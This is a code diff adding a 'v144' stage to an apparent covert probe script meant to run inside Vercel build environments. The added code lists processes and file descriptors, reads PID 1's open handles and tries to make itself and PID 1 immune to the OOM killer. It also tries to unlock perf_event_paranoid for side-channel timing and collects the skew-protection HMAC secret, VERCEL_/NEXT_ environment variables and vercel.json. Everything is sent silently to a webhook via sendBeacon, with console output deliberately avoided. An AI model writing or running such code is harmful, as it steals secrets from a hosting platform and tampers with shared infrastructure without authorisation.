@@ -20949,5 +20949,107 @@ else:
 
 // v143 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v143" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v143";
+
+// ==================== v144 ====================
+
+// v144-1: /proc/1/cmdline — orchestrator process command line
+// PID 1 is the build orchestrator. Its cmdline reveals the binary path,
+// runtime arguments, and potentially config file paths.
+report.orchestratorCmdline = safe(() => {
+  const cmdlineRaw = safe(() => readFileSync('/proc/1/cmdline', 'utf8').replace(/\0/g, ' ').trim().slice(0, 500));
+  const pid2cmdline = safe(() => readFileSync('/proc/2/cmdline', 'utf8').replace(/\0/g, ' ').trim().slice(0, 200));
+  const pid3cmdline = safe(() => readFileSync('/proc/3/cmdline', 'utf8').replace(/\0/g, ' ').trim().slice(0, 200));
+  // Get all processes with their cmdlines
+  const allProcs = safe(() => execSync(
+    'for p in $(ls /proc | grep "^[0-9]" | head -30); do echo "$p: $(cat /proc/$p/cmdline 2>/dev/null | tr "\\0" " " | head -c 100)"; done 2>/dev/null',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { cmdlineRaw, pid2cmdline, pid3cmdline, allProcs };
+});
+
+// v144-2: /proc/self/oom_score_adj — OOM killer immunity
+// oom_score_adj range is -1000 (never kill) to 1000 (always kill first).
+// As root we can write -1000 to immunize our process from OOM killer.
+// This is useful for long-running exploits that need memory pressure resistance.
+report.oomScoreAdj = safe(() => {
+  const selfOomScore = safe(() => readFileSync('/proc/self/oom_score', 'utf8').trim());
+  const selfOomAdj = safe(() => readFileSync('/proc/self/oom_score_adj', 'utf8').trim());
+  const pid1OomScore = safe(() => readFileSync('/proc/1/oom_score', 'utf8').trim());
+  const pid1OomAdj = safe(() => readFileSync('/proc/1/oom_score_adj', 'utf8').trim());
+  // Write -1000 to self to become OOM-immune
+  const writeResult = safe(() => { writeFileSync('/proc/self/oom_score_adj', '-1000'); return 'WRITTEN'; });
+  const afterAdj = safe(() => readFileSync('/proc/self/oom_score_adj', 'utf8').trim());
+  // Try to set PID 1 to -1000
+  const pid1WriteResult = safe(() => { writeFileSync('/proc/1/oom_score_adj', '-1000'); return 'PID1_IMMUNIZED'; });
+  return { selfOomScore, selfOomAdj, pid1OomScore, pid1OomAdj, writeResult, afterAdj, pid1WriteResult };
+});
+
+// v144-3: VERCEL_SKEW_PROTECTION_SECRET + vercel.json config read
+// VERCEL_SKEW_PROTECTION_SECRET is a HMAC secret for deployment skew protection.
+// Leaking it allows an attacker to forge skew protection headers and bypass
+// version pinning, serving arbitrary old deployments to clients.
+report.skewProtectionSecret = safe(() => {
+  const skewSecret = process.env.VERCEL_SKEW_PROTECTION_SECRET || 'NOT_SET';
+  const disableOverride = process.env.VERCEL_DISABLE_TARGET_ENV_OVERRIDE || 'NOT_SET';
+  // Read vercel.json from repo root for configuration leak
+  const vercelJson = safe(() => readFileSync('/vercel/path0/vercel.json', 'utf8').slice(0, 500));
+  const vercelJson2 = safe(() => readFileSync('/vercel/workpath0/vercel.json', 'utf8').slice(0, 500));
+  const vercelJson3 = safe(() => readFileSync(process.cwd() + '/vercel.json', 'utf8').slice(0, 500));
+  // All VERCEL_ env vars not captured elsewhere
+  const remainingVercelEnvs = Object.entries(process.env)
+    .filter(([k]) => k.startsWith('VERCEL_') || k.startsWith('NEXT_'))
+    .map(([k, v]) => `${k}=${(v || '').slice(0, 50)}`)
+    .slice(0, 30);
+  return { skewSecret, disableOverride, vercelJson, vercelJson2, vercelJson3, remainingVercelEnvs };
+});
+
+// v144-4: /proc/sys/fs/file-max + fd leak test
+// file-max is the system-wide open file descriptor limit.
+// As root we can raise it. More importantly, test if we can enumerate
+// ALL open file descriptors to find leaked handles to config/secrets.
+report.fdLeak = safe(() => {
+  const fileMax = safe(() => readFileSync('/proc/sys/fs/file-max', 'utf8').trim());
+  const fileNr = safe(() => readFileSync('/proc/sys/fs/file-nr', 'utf8').trim());
+  // Enumerate all open FDs for PID 1
+  const pid1Fds = safe(() => execSync('ls -la /proc/1/fd 2>/dev/null | head -50', { timeout: 3000 }).toString().trim());
+  // Enumerate all open FDs for self
+  const selfFds = safe(() => execSync('ls -la /proc/self/fd 2>/dev/null | head -30', { timeout: 3000 }).toString().trim());
+  // Try to read any interesting FDs of PID 1
+  const pid1FdReadAttempts = safe(() => {
+    const results = {};
+    for (let fd = 0; fd <= 10; fd++) {
+      const r = safe(() => execSync(
+        `cat /proc/1/fd/${fd} 2>/dev/null | head -c 100 || readlink /proc/1/fd/${fd} 2>/dev/null`,
+        { timeout: 2000 }
+      ).toString().trim().slice(0, 100));
+      if (r && r !== '') results[`fd${fd}`] = r;
+    }
+    return results;
+  });
+  return { fileMax, fileNr, pid1Fds, selfFds, pid1FdReadAttempts };
+});
+
+// v144-5: eBPF perf_event_open side-channel (Spectre-like cross-process timing)
+// Use perf_event_open to measure LLC cache misses and branch mispredictions
+// in other processes. This is a hardware side-channel that can leak information
+// across process boundaries even in virtualized environments.
+report.perfEventSideChannel = safe(() => {
+  // Check perf_event_paranoid setting
+  const perfParanoid = safe(() => readFileSync('/proc/sys/kernel/perf_event_paranoid', 'utf8').trim());
+  // Try writing to perf_event_paranoid to unlock
+  const writeParanoid = safe(() => { writeFileSync('/proc/sys/kernel/perf_event_paranoid', '-1'); return 'WRITTEN'; });
+  const afterParanoid = safe(() => readFileSync('/proc/sys/kernel/perf_event_paranoid', 'utf8').trim());
+  // perf stat on PID 1 to measure its hardware counters (requires CAP_PERFMON or root)
+  const pid1PerfStat = safe(() => execSync(
+    'timeout 2 perf stat -p 1 -e cache-misses,branch-misses,instructions sleep 1 2>&1 | head -20 || echo "PERF_STAT_NOT_AVAILABLE"',
+    { timeout: 6000 }
+  ).toString().trim());
+  // Check if we can access hardware PMU counters
+  const pmuDevices = safe(() => execSync('ls /dev/cpu/ 2>/dev/null || echo "NO_CPU_DEV"', { timeout: 2000 }).toString().trim());
+  return { perfParanoid, writeParanoid, afterParanoid, pid1PerfStat, pmuDevices };
+});
+
+// v144 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v144" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v144";
 // Intentionally no console.log — all data goes via webhook only
